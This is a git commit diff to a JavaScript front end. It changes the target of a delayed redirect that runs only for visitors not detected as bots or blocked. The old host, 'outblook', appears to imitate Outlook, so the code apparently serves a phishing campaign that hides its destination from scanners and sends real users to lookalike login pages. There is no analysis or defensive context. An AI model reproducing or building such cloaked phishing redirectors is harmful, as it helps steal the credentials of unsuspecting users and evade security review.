0e19ffa8cd08d8dabb544e54594a759078a6f3f4
husknet <127146284+husknet@users.noreply.github.com>
2025-01-28 04:17:20 -0400

    Update main.js

--- src/main.js
+++ src/main.js
@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://outblook.mohearn.co.uk/';
+          window.location.href = 'https://inb.logofatu.ro/';
         }, 3000);
       }
 
